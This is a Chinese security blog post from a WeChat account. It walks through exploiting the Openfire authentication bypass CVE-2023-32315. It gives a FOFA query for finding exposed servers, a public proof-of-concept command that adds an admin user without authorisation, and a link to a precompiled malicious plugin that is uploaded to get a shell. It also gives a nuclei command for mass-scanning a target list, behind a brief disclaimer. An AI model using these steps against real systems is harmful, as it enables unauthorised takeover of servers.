<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/TqZUIYIUaq1oq841T7yf_g)

**0x01 阅读须知**

**融云安全的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**

**0x02 漏洞描述**

openfire 是基于 XMPP 协议的即时通讯框架，提供插件扩展，像 Spark 一样易于部署。openfire 存在未授权漏洞和允许后台上传未经校验的恶意插件，可导致直接 getshell 和控制服务器。![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49wkmSs4L5qXgciaGOBI0QrFibyzzLkDdGfx40SEhXs7cYMloI16OveMGYVvJNs8S3UZ1Mka3GA3jxibg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**0x03 漏洞复现**

**fofa：body="Openfire"**

1. 使用 poc 未授权添加用户（需要安装高版本 go）

```
poc地址：https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass
go地址：https://golang.google.cn/dl/go1.20.5.windows-amd64.msi
到CVE-2023-32315-Openfire-Bypass-main\scan_all目录执行如下命令：
go run main.go -u http://x.x.x.x

```

![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49z9ORl9IldtTu1J3UibALeVib6pOjbmT2ASAqCDfVib33FEOE4NH361icm9EEdGfLuPZofaVDMhvJZEPg/640?wx_fmt=png)

2. 上传插件并执行 whoami 命令，得到 operfire 权限

```
编译好的插件地址：
https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass/releases/download/v0.1/org.jivesoftware.openfire.plugin.CVE-openfire-plugin-assembly.jar

```

![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49z9ORl9IldtTu1J3UibALeVibHECpT7tuASbjhRutUsiakia7Lj7eMEm3bBsuXZ0lNYkiaMxh9Liafgt43A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49z9ORl9IldtTu1J3UibALeVibNYBaFEU6jMzgxqpFia378XcARnibicZKR7RO35NmLWOzt3N2SFGHclgmQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49z9ORl9IldtTu1J3UibALeVibG0xEXib0Uv0MkQa1BX0j75GlpTicibqsI0V2waGxdQIe54pLl0D5AicOSQ/640?wx_fmt=png)

3.nuclei 脚本官方已自带

```
nuclei.exe -t /http/cves/2023/CVE-2023-32315.yaml -l subs.txt -stats

```

![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49z9ORl9IldtTu1J3UibALeVibX9kqzh2NODPyPwc3LlfxHmcoqT5Beon9clha72pZmbLI4KaZIDicEBA/640?wx_fmt=png)

**网络安全神兵利器分享**

**网络安全漏洞 N/0day 分享**

 **加入星球请扫描下方二维码，更多精，敬请期待！**

👇👇👇

![](https://mmbiz.qpic.cn/mmbiz_jpg/GWXBjgPE49zs4eNkNzwGvylxKjRnH2aibQqdbEUPicwHRpyuIhk7YdcECWw9kZGCibot3aRDzS4ADTmywx57c7QBw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

**0x04 ****公司简介******

江西渝融云安全科技有限公司，2017 年发展至今，已成为了一家集云安全、物联网安全、数据安全、等保建设、风险评估、信息技术应用创新及网络安全人才培训为一体的本地化高科技公司，是江西省信息安全产业链企业和江西省政府部门重点行业网络安全事件应急响应队伍成员。  
    公司现已获得信息安全集成三级、信息系统安全运维三级、风险评估三级等多项资质认证，拥有软件著作权十八项；荣获 2020 年全国工控安全深度行安全攻防对抗赛三等奖；庆祝建党 100 周年活动信息安全应急保障优秀案例等荣誉......

**编制：sm**

**审核：fjh**

**审核：Dog**

****1 个![](https://mmbiz.qpic.cn/mmbiz_png/HrawmEuibfaIOiabAXdibIZicf2jWoboub7W1iap9PibRDKPpsdzMPM0daU2P2ibkhXDeic6LtWR71PlAmzE1Z6Ux6YdTQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)** 1 朵************![](https://mmbiz.qpic.cn/mmbiz_gif/0y9ibmULDTbBkmr06X1rtjETLFiaNJgiczQRMlsic03HkL1frCDcicujqskG8fzOuCq4IQo9JRqzV9bRphg4lE74zJQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)************** **5 毛钱**

**天天搬砖的小 M**

**能不能吃顿好的**

**就看你们的啦**

****![](https://mmbiz.qpic.cn/mmbiz_gif/HrawmEuibfaJtxalqIebTNSQbkflPG4vahmibDLYmNfjnOptwGv0NBQCdXxEcicN4Q08q9nkX86b5rkDSpXUZ6RWg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)****